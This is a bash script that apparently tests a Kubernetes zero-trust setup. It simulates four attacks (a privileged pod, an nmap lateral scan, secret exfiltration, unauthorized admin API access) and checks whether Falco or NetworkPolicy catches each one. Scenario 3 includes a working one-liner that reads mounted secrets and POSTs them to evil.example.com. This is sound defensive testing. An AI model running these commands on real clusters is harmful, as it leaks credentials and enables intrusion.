#!/bin/bash

# Color definitions
function print_headline() {
  echo -e "\e[1;34m$1\e[0m"
}

function print_info() {
  echo -e "\e[0;32m$1\e[0m"
}

function print_error() {
  echo -e "\e[0;31m$1\e[0m"
}

function print_warning() {
  echo -e "\e[0;33m$1\e[0m"
}

function print_success() {
  echo -e "\e[1;32m$1\e[0m"
}

function print_attack() {
  echo -e "\e[0;35m$1\e[0m"
}

print_headline "Zero-Trust Architecture Security Attack Simulation"
print_headline "=================================================="
echo ""

# Check if namespace exists
if ! kubectl get namespace zero-trust-demo > /dev/null 2>&1; then
  print_error "Namespace zero-trust-demo not found. Please run deploy.sh first!"
  exit 1
fi
kubectl config set-context --current --namespace=zero-trust-demo
echo ""

print_headline "SCENARIO 1: Pod Escape Attempt"
print_attack "Simulating container escape attempt via privileged pod"
echo ""
print_info "Creating pod with privileged security context (should be denied)"
cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: ubuntu:20.04
    securityContext:
      privileged: true
    command: ["sleep", "3600"]
EOF

sleep 3
if kubectl get pod privileged-pod > /dev/null 2>&1; then
  print_error "✗ Failed: Privileged pod was allowed to be created"
  kubectl delete pod privileged-pod --force --grace-period=0
else
  print_success "✓ Success: Privileged pod was denied as expected"
fi
echo ""

print_headline "SCENARIO 2: Lateral Movement Attempt"
print_attack "Simulating attacker's attempt to move laterally in the cluster"
echo ""
print_info "Creating pod that attempts to scan internal network"
kubectl run network-scan --image=alpine --restart=Never -- sh -c "apk add nmap && nmap -T4 10.0.0.0/8"
sleep 5

print_info "Checking if network scan was detected by Falco"
if kubectl logs -l app=falco --tail=50 | grep -q "network scan"; then
  print_success "✓ Success: Network scan activity was detected"
else
  print_warning "⚠ Warning: Network scan activity was not explicitly detected"
fi

print_info "Checking if network scan was blocked by NetworkPolicy"
pod_status=$(kubectl get pod network-scan -o jsonpath='{.status.phase}')
if [ "$pod_status" == "Succeeded" ]; then
  print_error "✗ Failed: Network scan completed successfully"
else
  print_success "✓ Success: Network scan was blocked"
fi
kubectl delete pod network-scan --force --grace-period=0
echo ""

print_headline "SCENARIO 3: Secret Exfiltration Attempt"
print_attack "Simulating attacker attempting to exfiltrate secrets"
echo ""
print_info "Creating pod that attempts to read secrets and send them externally"
kubectl run secret-thief --image=alpine --restart=Never -- sh -c "apk add curl && curl -X POST -d \"$(cat /var/run/secrets/* 2>/dev/null)\" https://evil.example.com"
sleep 5

print_info "Checking if secret exfiltration was detected by Falco"
if kubectl logs -l app=falco --tail=50 | grep -q "exfiltration"; then
  print_success "✓ Success: Secret exfiltration attempt was detected"
else
  print_warning "⚠ Warning: Secret exfiltration was not explicitly detected"
fi

print_info "Checking if external communication was blocked by NetworkPolicy"
pod_status=$(kubectl get pod secret-thief -o jsonpath='{.status.phase}')
if [ "$pod_status" == "Succeeded" ]; then
  print_error "✗ Failed: External communication was allowed"
else
  print_success "✓ Success: External communication was blocked"
fi
kubectl delete pod secret-thief --force --grace-period=0
echo ""

print_headline "SCENARIO 4: Unauthorized API Access"
print_attack "Simulating attacker attempting to access unauthorized services"
echo ""
print_info "Creating pod that attempts to access an unauthorized service"
kubectl run api-attack --image=curlimages/curl --restart=Never -- sh -c "curl -s http://backend:8080/admin"
sleep 5

pod_logs=$(kubectl logs api-attack)
kubectl delete pod api-attack --force --grace-period=0

if echo "$pod_logs" | grep -q "Forbidden" || echo "$pod_logs" | grep -q "Access denied"; then
  print_success "✓ Success: Unauthorized API access was blocked"
else
  print_error "✗ Failed: Unauthorized API access was allowed or service was reachable"
fi
echo ""

print_headline "Security Testing Complete!"
print_info "Review the results above to understand your Zero-Trust architecture's effectiveness"
print_info "To clean up resources, run: ./cleanup.sh"
echo ""

exit 0
